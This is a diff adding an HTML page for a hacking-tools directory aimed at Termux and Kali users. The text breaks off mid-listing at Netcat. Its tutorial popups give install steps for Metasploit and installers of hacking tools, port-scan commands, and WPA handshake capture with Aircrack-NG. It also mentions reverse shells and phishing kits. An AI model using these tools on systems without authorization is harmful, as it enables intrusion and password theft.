@@ -1,0 +1,1245 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+<title>SchoolOfSec | Master Cybersecurity</title>
+<link rel="icon" type="image/png" href="assets/favicon.png"/>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Lexend+Deca:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+<link rel="stylesheet" href="css/style.css"/>
+<base target="_blank">
+</head>
+<body>
+
+
+<!-- LOADING SCREEN -->
+<div id="loader">
+  <div class="loader-term">
+    <div>root@geektimes:~$ <span style="color:var(--pri)">init_system()</span></div>
+    <div style="color:var(--t3)">Loading modules...</div>
+    <div style="color:var(--t3)">Mounting filesystem...</div>
+    <div style="color:var(--t3)">Establishing secure connection...</div>
+  </div>
+  <div class="loader-bar"><div class="loader-bar-inner" id="loaderBar"></div></div>
+</div>
+<!-- TOAST CONTAINER -->
+<div id="toastContainer"></div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modalOverlay" onclick="closeModal(event)">
+  <div class="modal-box" id="modalBox" onclick="event.stopPropagation()">
+    <div class="modal-hd">
+      <div class="modal-title" id="modalTitle">Tutorial</div>
+      <div class="modal-close" onclick="closeModal()"><i class="fa fa-times"></i></div>
+    </div>
+    <div class="modal-bd" id="modalBody"></div>
+  </div>
+</div>
+
+<!-- ═══════════════════ TOPBAR ═══════════════════ -->
+<div class="topbar">
+  <div class="topbar-w">
+    <div class="tb-left">
+      <span class="tb-date" id="tbDate">THU · 21 MAY 2026</span>
+      <div class="tb-sep"></div>
+      <span class="tb-edition">BY · SABOOR SHAWKAT</span>
+      <div class="tb-sep"></div>
+      <div class="live-pill"><span class="live-dot"></span>HELLO GEEK</div>
+    </div>
+    <div class="tb-right">
+      <a href="#" onclick="showToast('Submit feature coming soon!')">Submit A Tool</a>
+      <div class="tb-sep2"></div>
+      <a href="#">RSS</a>
+      <div class="tb-sep2"></div>
+      <a href="#">Newsletter</a>
+      <div class="tb-sep2"></div>
+      <a href="#">Advertise</a>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ MASTHEAD ═══════════════════ -->
+<div class="masthead">
+  <div class="mast-w">
+    <div class="logo-wrap">
+      <div class="logo-box"><a href="#"><img src="assets/profile.png" alt="SchoolOfSec logo"/></a></div>
+      <div class="logo-text">
+        <span class="logo-main">School<span>OfSec</span></span>
+        <span class="logo-sub">Master Cybersecurity</span>
+      </div>
+    </div>
+    <div class="mast-sep"></div>
+    <div class="mast-desc">
+      Remember With <strong>Great Powers</strong> Comes <strong>Great Responsibility</strong><br/>
+    
+    </div>
+    <div class="mast-right">
+      <div class="mstat"><span class="mstat-n counter" data-target="142">0</span><span class="mstat-l">K Readers</span></div>
+      <div class="mstat"><span class="mstat-n counter" data-target="340">0</span><span class="mstat-l">Tools Listed</span></div>
+      <div class="mstat"><span class="mstat-n counter" data-target="980">0</span><span class="mstat-l">Tutorials</span></div>
+    </div>
+  </div>
+</div>
+ 
+
+<!-- ═══════════════════ CAT STRIP ═══════════════════ -->
+<div class="cat-strip">
+  <div class="cs-inner">
+    <div class="cs-btn act" onclick="filterCat('all',this)"><span class="cs-dot" style="background:var(--g)"></span>All Tools</div>
+    <div class="cs-btn" onclick="filterCat('exploit',this)"><span class="cs-dot" style="background:var(--r)"></span>Exploitation</div>
+    <div class="cs-btn" onclick="filterCat('network',this)"><span class="cs-dot" style="background:var(--b)"></span>Network</div>
+    <div class="cs-btn" onclick="filterCat('phishing',this)"><span class="cs-dot" style="background:var(--p)"></span>Phishing</div>
+    <div class="cs-btn" onclick="filterCat('osint',this)"><span class="cs-dot" style="background:var(--g)"></span>OSINT</div>
+    <div class="cs-btn" onclick="filterCat('recon',this)"><span class="cs-dot" style="background:var(--y)"></span>Recon</div>
+    <div class="cs-btn" onclick="filterCat('password',this)"><span class="cs-dot" style="background:var(--o)"></span>Password</div>
+    <div class="cs-btn" onclick="filterCat('system',this)"><span class="cs-dot" style="background:#38bdf8"></span>System</div>
+    <div class="cs-btn" onclick="filterCat('style',this)"><span class="cs-dot" style="background:#e879f9"></span>Style &amp; UI</div>
+    <div class="cs-btn" onclick="filterCat('distro',this)"><span class="cs-dot" style="background:#fb923c"></span>Distros</div>
+    <div class="cs-btn" onclick="filterCat('emulator',this)"><span class="cs-dot" style="background:#34d399"></span>Emulators</div>
+  </div>
+</div>
+
+<!-- ═══════════════════ KALI HERO BANNER ═══════════════════ -->
+<div class="kali-hero">
+  <canvas id="heroCanvas" class="kali-canvas"></canvas>
+  <canvas id="particleCanvas"></canvas>
+  <div class="kali-overlay"></div>
+  <div class="kali-inner">
+    <div class="kali-left">
+      <div class="kali-eyebrow">
+        <span class="kali-eyebrow-line"></span>
+        <span class="kali-eyebrow-tag"><i class="fa fa-user-secret"></i>Welcome To The SchoolOfSec</span>
+        <span class="kali-eyebrow-line"></span>
+      </div>
+      <h1 class="kali-title">
+        <span class="kali-title-top">LINUX</span>
+        <span class="kali-title-main">TOOLS<span class="kali-title-accent">.</span></span>
+        <span class="kali-title-sub">DIRECTORY</span>
+      </h1>
+      <p class="kali-desc">Enjoy The List Of Cybersecurity Tools In Linux And Termux,<br/>Remember Be Ethical</p>
+      <div class="kali-terminal-line">
+        <span class="kali-prompt">root@kali</span><span class="kali-at">:</span>
+        <span class="kali-cmd" id="typedCmd"></span><span class="kali-cursor">▋</span>
+      </div>
+      <div class="kali-actions">
+        <div class="kali-search-wrap">
+          <i class="fa fa-search kali-search-ico"></i>
+          <input type="text" class="kali-search-input" placeholder="Search tools — nmap, hydra, metasploit..." id="heroSearch" oninput="liveSearch(this.value)"/>
+        </div>
+        <a href="#toolsContainer" class="kali-cta"><i class="fa fa-layer-group"></i> Browse All Tools</a>
+      </div>
+      <div class="kali-badges">
+        <span class="kali-badge kali-badge-r"><i class="fa fa-skull-crossbones"></i> Kali Linux</span>
+        <span class="kali-badge kali-badge-b"><i class="fa fa-android"></i> Android Ready</span>
+        <span class="kali-badge kali-badge-y"><i class="fa fa-sync-alt"></i> May 2026</span>
+      </div>
+    </div>
+    <div class="kali-right">
+      <div class="kali-dragon-badge">
+        <div class="kali-dragon-inner">
+          <div class="kali-dragon-icon"><i class="fa fa-user-secret"></i></div>
+          <div class="kali-dragon-label">HELLO!</div>
+          <div class="kali-dragon-sub">BUDDY</div>
+        </div>
+        <div class="kali-dragon-ring kali-ring1"></div>
+        <div class="kali-dragon-ring kali-ring2"></div>
+        <div class="kali-dragon-ring kali-ring3"></div>
+      </div>
+      <div class="kali-stat-grid">
+        <div class="kali-stat"><span class="kali-stat-n counter" data-target="30">0</span><span class="kali-stat-l">Tools</span></div>
+        <div class="kali-stat"><span class="kali-stat-n counter" data-target="10">0</span><span class="kali-stat-l">Categories</span></div>
+        <div class="kali-stat"><span class="kali-stat-n counter" data-target="600">0</span><span class="kali-stat-l">Kali Tools</span></div>
+        <div class="kali-stat"><span class="kali-stat-n">Free</span><span class="kali-stat-l">All Tools</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ CATEGORIES GRID ═══════════════════ -->
+<div class="cat-grid-section">
+  <div class="wrap">
+    <div class="cgs-header reveal">
+      <div class="cgs-title-wrap">
+        <div class="cgs-bar"></div>
+        <span class="cgs-title">Browse by Category</span>
+        <span class="cgs-chip">10 Sections</span>
+      </div>
+      <p class="cgs-sub">Select a category to jump directly to those tools</p>
+    </div>
+    <div class="cat-grid">
+      <div class="cat-grid-card reveal reveal-delay-1" onclick="filterCat('exploit',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#ff4444;background:rgba(255,68,68,.1);border-color:rgba(255,68,68,.2)">💥</div>
+        <div class="cgc-body">
+          <div class="cgc-name">Exploitation</div>
+          <div class="cgc-desc">Frameworks &amp; exploit modules</div>
+          <div class="cgc-count" style="color:#ff4444">5 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#ff4444"><i class="fa fa-arrow-right"></i></div>
+      </div>
+      <div class="cat-grid-card reveal reveal-delay-1" onclick="filterCat('network',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#00aaff;background:rgba(0,170,255,.1);border-color:rgba(0,170,255,.2)">🌐</div>
+        <div class="cgc-body">
+          <div class="cgc-name">Network</div>
+          <div class="cgc-desc">Scanners &amp; traffic analysis</div>
+          <div class="cgc-count" style="color:#00aaff">4 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#00aaff"><i class="fa fa-arrow-right"></i></div>
+      </div>
+      <div class="cat-grid-card reveal reveal-delay-2" onclick="filterCat('phishing',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#b060ff;background:rgba(176,96,255,.1);border-color:rgba(176,96,255,.2)">🎣</div>
+        <div class="cgc-body">
+          <div class="cgc-name">Phishing</div>
+          <div class="cgc-desc">Social engineering &amp; phishing kits</div>
+          <div class="cgc-count" style="color:#b060ff">5 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#b060ff"><i class="fa fa-arrow-right"></i></div>
+      </div>
+      <div class="cat-grid-card reveal reveal-delay-2" onclick="filterCat('osint',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#00ff88;background:rgba(0,255,136,.07);border-color:rgba(0,255,136,.2)">🔍</div>
+        <div class="cgc-body">
+          <div class="cgc-name">OSINT</div>
+          <div class="cgc-desc">Open-source intelligence gathering</div>
+          <div class="cgc-count" style="color:#00ff88">5 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#00ff88"><i class="fa fa-arrow-right"></i></div>
+      </div>
+      <div class="cat-grid-card reveal reveal-delay-3" onclick="filterCat('recon',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#f5c518;background:rgba(245,197,24,.1);border-color:rgba(245,197,24,.2)">📡</div>
+        <div class="cgc-body">
+          <div class="cgc-name">Recon</div>
+          <div class="cgc-desc">Reconnaissance &amp; fingerprinting</div>
+          <div class="cgc-count" style="color:#f5c518">3 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#f5c518"><i class="fa fa-arrow-right"></i></div>
+      </div>
+      <div class="cat-grid-card reveal reveal-delay-3" onclick="filterCat('password',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#ff7f50;background:rgba(255,127,80,.1);border-color:rgba(255,127,80,.2)">🔑</div>
+        <div class="cgc-body">
+          <div class="cgc-name">Password</div>
+          <div class="cgc-desc">Crackers &amp; brute-force tools</div>
+          <div class="cgc-count" style="color:#ff7f50">2 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#ff7f50"><i class="fa fa-arrow-right"></i></div>
+      </div>
+      <div class="cat-grid-card reveal reveal-delay-4" onclick="filterCat('system',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#38bdf8;background:rgba(56,189,248,.1);border-color:rgba(56,189,248,.2)">⚙️</div>
+        <div class="cgc-body">
+          <div class="cgc-name">System</div>
+          <div class="cgc-desc">Terminal utilities &amp; system tools</div>
+          <div class="cgc-count" style="color:#38bdf8">2 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#38bdf8"><i class="fa fa-arrow-right"></i></div>
+      </div>
+      <div class="cat-grid-card reveal reveal-delay-4" onclick="filterCat('style',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#e879f9;background:rgba(232,121,249,.1);border-color:rgba(232,121,249,.2)">🎨</div>
+        <div class="cgc-body">
+          <div class="cgc-name">Style &amp; UI</div>
+          <div class="cgc-desc">Terminal aesthetics &amp; UI tools</div>
+          <div class="cgc-count" style="color:#e879f9">2 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#e879f9"><i class="fa fa-arrow-right"></i></div>
+      </div>
+      <div class="cat-grid-card reveal reveal-delay-5" onclick="filterCat('distro',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#fb923c;background:rgba(251,146,60,.1);border-color:rgba(251,146,60,.2)">🐉</div>
+        <div class="cgc-body">
+          <div class="cgc-name">Distros</div>
+          <div class="cgc-desc">Linux distros for Android</div>
+          <div class="cgc-count" style="color:#fb923c">3 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#fb923c"><i class="fa fa-arrow-right"></i></div>
+      </div>
+      <div class="cat-grid-card reveal reveal-delay-5" onclick="filterCat('emulator',null);document.getElementById('toolsContainer').scrollIntoView({behavior:'smooth'})">
+        <div class="cgc-icon" style="--cgc:#34d399;background:rgba(52,211,153,.1);border-color:rgba(52,211,153,.2)">📱</div>
+        <div class="cgc-body">
+          <div class="cgc-name">Emulators</div>
+          <div class="cgc-desc">Android emulation &amp; VMs</div>
+          <div class="cgc-count" style="color:#34d399">2 Tools</div>
+        </div>
+        <div class="cgc-arrow" style="color:#34d399"><i class="fa fa-arrow-right"></i></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ═══════════════════ MAIN CONTENT ═══════════════════ -->
+<div class="wrap">
+
+  <div class="page-layout">
+  <div id="toolsContainer">
+    <!--Warning For Users -->
+<div class="warn-box">
+    <i class="fa fa-exclamation-triangle"></i>
+    <p><strong>Educational Purpose Only:</strong> The Following Tools Are Listed Strictly For <strong> Cybersecurity </strong> Education And Authorized Penetration Testing. Using These Tools Against Systems Or Individuals Without Explicit Permission Is Illegal And Unethical. SchoolOfSec Is Not Responsible For Any Misuse.</p>
+  </div>
+  <!-- FEATURED TOP 2 -->
+  <div class="sh" style="padding-top:10px">
+    <div class="sh-l"><div class="sh-bar" style="background:var(--g)"></div><span class="sh-title">Featured Tools</span><span class="sh-chip">Editor's Pick</span></div>
+  </div>
+  <div class="tools-grid-2" data-section="featured">
+    <!-- Metasploit -->
+    <div class="tool-card-feat" data-cat="exploit" data-name="metasploit">
+      <div class="tcf-banner" style="background:linear-gradient(135deg,#0d0005,#1a0010)">🐉
+        <div style="position:absolute;top:8px;left:8px;background:var(--g);color:#000;font-size:8px;font-weight:800;padding:2px 8px;border-radius:2px;letter-spacing:1px;z-index:1">TOP PICK</div>
+      </div>
+      <div class="tcf-body">
+        <div class="tcf-cats">
+          <span class="tcb tcb-r">Exploitation</span>
+          <span class="tcb tcb-g">Free</span>
+          <span class="tcb tcb-b">No Root</span>
+        </div>
+        <div class="tcf-name">Metasploit Framework</div>
+        <div class="tcf-desc">The world's most widely used penetration testing framework. Includes 2000+ exploit modules, auxiliary scanners, post-exploitation tools, and a full Meterpreter payload. Fully functional on Termux without root.</div>
+        <div class="tcf-foot">
+          <div class="tcf-foot-left">
+            <span class="tc-tag">#msf</span><span class="tc-tag">#exploit</span><span class="tc-tag">#pentest</span>
+          </div>
+          <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Metasploit Framework','<p><strong>Installation:</strong></p><pre>pkg install unstable-repo\npkg install metasploit</pre><p><strong>Start MSF:</strong></p><pre>msfconsole</pre><p><strong>Basic scan:</strong></p><pre>use auxiliary/scanner/portscan/tcp\nset RHOSTS target.com\nrun</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+        </div>
+      </div>
+    </div>
+    <!-- Kali NetHunter -->
+    <div class="tool-card-feat" data-cat="distro" data-name="kali nethunter">
+      <div class="tcf-banner" style="background:linear-gradient(135deg,#00050d,#000f1a)">🐉
+        <div style="position:absolute;top:8px;left:8px;background:var(--b);color:#000;font-size:8px;font-weight:800;padding:2px 8px;border-radius:2px;letter-spacing:1px;z-index:1">DISTRO</div>
+      </div>
+      <div class="tcf-body">
+        <div class="tcf-cats">
+          <span class="tcb tcb-b">Linux Distro</span>
+          <span class="tcb tcb-g">Free</span>
+          <span class="tcb tcb-y">Android</span>
+        </div>
+        <div class="tcf-name">Kali NetHunter</div>
+        <div class="tcf-desc">Full Kali Linux environment running inside Termux via NetHunter. Provides access to 600+ security tools including Metasploit, Nmap, Burp, Hydra and more — all without rooting your Android device.</div>
+        <div class="tcf-foot">
+          <div class="tcf-foot-left">
+            <span class="tc-tag">#kali</span><span class="tc-tag">#linux</span><span class="tc-tag">#android</span>
+          </div>
+          <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Kali NetHunter','<p><strong>Install proot-distro:</strong></p><pre>pkg install proot-distro</pre><p><strong>Install Kali:</strong></p><pre>proot-distro install kali</pre><p><strong>Login:</strong></p><pre>proot-distro login kali</pre><p><strong>Update Kali:</strong></p><pre>apt update && apt full-upgrade -y</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- EXPLOITATION -->
+  <div class="cat-section-hd" data-section="exploit" style="background:rgba(255,68,68,.08);border:1px solid rgba(255,68,68,.2)">
+    <div class="csh-icon">💥</div>
+    <div class="csh-info">
+      <div class="csh-title">Exploitation Tools</div>
+      <div class="csh-desc">Frameworks and tools for vulnerability exploitation and security testing</div>
+    </div>
+    <div class="csh-count" style="color:var(--r)">5 Tools</div>
+  </div>
+  <div class="tools-list">
+
+    <div class="tool-card tc-exploit" data-cat="exploit" data-name="metasploit">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#0d0005,#1a0010)"><span class="tc-rank">#01</span>🐉</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Metasploit Framework</div><div class="tc-ver">v6.4 · 2026</div></div>
+          <div class="tc-badges"><span class="tcb tcb-r">Exploit</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">World's most used pentesting platform. 2000+ exploit modules, Meterpreter payloads, auxiliary scanners, post-exploitation tools. Runs fully on Termux — no root required.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#msf</span><span class="tc-tag">#exploit</span><span class="tc-tag">#pentest</span><span class="tc-tag">#meterpreter</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Metasploit Framework','<p><strong>Install:</strong></p><pre>pkg install unstable-repo\npkg install metasploit</pre><p><strong>Launch:</strong></p><pre>msfconsole</pre><p><strong>Search exploits:</strong></p><pre>search type:exploit name:windows</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-exploit" data-cat="exploit" data-name="tool x toolx">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#150005,#200010)"><span class="tc-rank">#02</span>⚔️</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Tool-X</div><div class="tc-ver">Latest · Termux</div></div>
+          <div class="tc-badges"><span class="tcb tcb-r">Exploit</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">A Kali Linux hacking tools installer for Termux. Lets you install almost any Kali tool in Termux &amp; GNURoot with a single command. Supports 370+ tools across all categories.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#toolx</span><span class="tc-tag">#installer</span><span class="tc-tag">#kali</span><span class="tc-tag">#termux</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle" style="color:var(--t3)"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Tool-X','<p><strong>Install:</strong></p><pre>pkg install git\ngit clone https://github.com/rajkumardusad/Tool-X\ncd Tool-X\nchmod +x install\n./install</pre><p><strong>Run:</strong></p><pre>Tool-X</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-exploit" data-cat="exploit" data-name="darkfly">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#020008,#08001a)"><span class="tc-rank">#03</span>🌑</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">DarkFly Tool</div><div class="tc-ver">Latest · Termux</div></div>
+          <div class="tc-badges"><span class="tcb tcb-r">Exploit</span><span class="tcb tcb-p">Multi</span></div>
+        </div>
+        <div class="tc-desc">An all-in-one hacking tool installer for Termux. Provides a menu-driven interface to install and launch a wide range of offensive security tools directly from your Android terminal.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#darkfly</span><span class="tc-tag">#multi</span><span class="tc-tag">#hacking</span><span class="tc-tag">#termux</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle" style="color:var(--t3)"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('DarkFly','<p><strong>Install:</strong></p><pre>pkg install git python2\ngit clone https://github.com/Ranginang67/DarkFly-Tool\ncd DarkFly-Tool\npython2 install.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-exploit" data-cat="exploit" data-name="hacking lab">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#0d0a00,#1a1400)"><span class="tc-rank">#04</span>🧪</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Hacking Lab</div><div class="tc-ver">Latest · Termux</div></div>
+          <div class="tc-badges"><span class="tcb tcb-r">Lab</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">A comprehensive hacking lab environment for Termux. Bundles multiple offensive tools and provides a structured lab setup for security learners to practice pentesting techniques on Android.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#lab</span><span class="tc-tag">#practice</span><span class="tc-tag">#termux</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-half"></i><i class="fa fa-circle" style="color:var(--t3)"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Hacking Lab','<p><strong>Install:</strong></p><pre>pkg install git\ngit clone https://github.com/Hacking-Lab\ncd Hacking-Lab\nbash setup.sh</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-exploit" data-cat="exploit" data-name="lazymux">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#070012,#0f0020)"><span class="tc-rank">#05</span>😴</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">LazyMux</div><div class="tc-ver">Latest · Termux</div></div>
+          <div class="tc-badges"><span class="tcb tcb-r">Installer</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">A lazy installer for Termux — makes it easy to install 100+ hacking tools with a simple numbered menu. Great for beginners who want quick access to tools without memorizing commands.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#lazymux</span><span class="tc-tag">#installer</span><span class="tc-tag">#beginner</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle" style="color:var(--t3)"></i><i class="fa fa-circle" style="color:var(--t3)"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('LazyMux','<p><strong>Install:</strong></p><pre>pkg install git python2\ngit clone https://github.com/Gameye98/Lazymux\ncd Lazymux\npython2 lazymux.py</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+  </div>
+
+  <!-- NETWORK TOOLS -->
+  <div class="cat-section-hd" data-section="network" style="background:rgba(0,170,255,.07);border:1px solid rgba(0,170,255,.2)">
+    <div class="csh-icon">🌐</div>
+    <div class="csh-info">
+      <div class="csh-title">Network Tools</div>
+      <div class="csh-desc">Scanners, sniffers, wireless auditing and network analysis tools</div>
+    </div>
+    <div class="csh-count" style="color:var(--b)">4 Tools</div>
+  </div>
+  <div class="tools-list">
+
+    <div class="tool-card tc-network" data-cat="network" data-name="nmap">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#051a05,#081f08)"><span class="tc-rank">#01</span>🗺️</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Nmap</div><div class="tc-ver">v7.95 · Network Mapper</div></div>
+          <div class="tc-badges"><span class="tcb tcb-b">Network</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">The world's most popular network scanner. Discovers hosts, open ports, services, OS fingerprinting and runs vulnerability NSE scripts. Fully available in Termux via <code style="color:var(--g)">pkg install nmap</code>.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#nmap</span><span class="tc-tag">#scanner</span><span class="tc-tag">#network</span><span class="tc-tag">#recon</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Nmap','<p><strong>Install:</strong></p><pre>pkg install nmap</pre><p><strong>Basic scan:</strong></p><pre>nmap target.com</pre><p><strong>Service detection:</strong></p><pre>nmap -sV target.com</pre><p><strong>OS detection:</strong></p><pre>nmap -O target.com</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-network" data-cat="network" data-name="aircrack aircrack-ng">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#001510,#002020)"><span class="tc-rank">#02</span>📶</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Aircrack-NG</div><div class="tc-ver">v1.7 · WiFi Auditor</div></div>
+          <div class="tc-badges"><span class="tcb tcb-b">Wireless</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">Complete WiFi security auditing suite. Captures WPA/WPA2 handshakes and cracks passwords using dictionary attacks. Includes airodump-ng, aireplay-ng and airmon-ng for full wireless auditing.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#wifi</span><span class="tc-tag">#wpa</span><span class="tc-tag">#wireless</span><span class="tc-tag">#handshake</span></div>
+          <div class="tc-actions">
+            <span class="tc-diff"><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i><i class="fa fa-circle dot-fill"></i></span>
+            <a href="#" class="tc-btn tc-btn-o" onclick="showToast('Opening GitHub...')"><i class="fab fa-github"></i> GitHub</a>
+            <a href="#" class="tc-btn tc-btn-g" onclick="openTutorial('Aircrack-NG','<p><strong>Install:</strong></p><pre>pkg install aircrack-ng</pre><p><strong>Monitor mode:</strong></p><pre>airmon-ng start wlan0</pre><p><strong>Capture handshake:</strong></p><pre>airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon</pre>')"><i class="fa fa-book-open"></i> Tutorial</a>
+          </div>
+        </div>
+      </div>
+      <div class="tc-arr"><i class="fa fa-arrow-right"></i></div>
+    </div>
+
+    <div class="tool-card tc-network" data-cat="network" data-name="netcat">
+      <div class="tc-icon-box" style="background:linear-gradient(160deg,#001018,#001f30)"><span class="tc-rank">#03</span>🔌</div>
+      <div class="tc-body">
+        <div class="tc-top">
+          <div class="tc-name-wrap"><div class="tc-name">Netcat</div><div class="tc-ver">TCP/UDP Swiss Army Knife</div></div>
+          <div class="tc-badges"><span class="tcb tcb-b">Network</span><span class="tcb tcb-g">Free</span></div>
+        </div>
+        <div class="tc-desc">The classic networking utility for reading and writing data across network connections using TCP/UDP. Used for port scanning, reverse shells, file transfers, banner grabbing and creating backdoors.</div>
+        <div class="tc-foot">
+          <div class="tc-tags"><span class="tc-tag">#netcat</span><span class="tc-tag">#nc</span><span class="tc-tag">#shell</span><span class="tc-tag">#network</span></div>
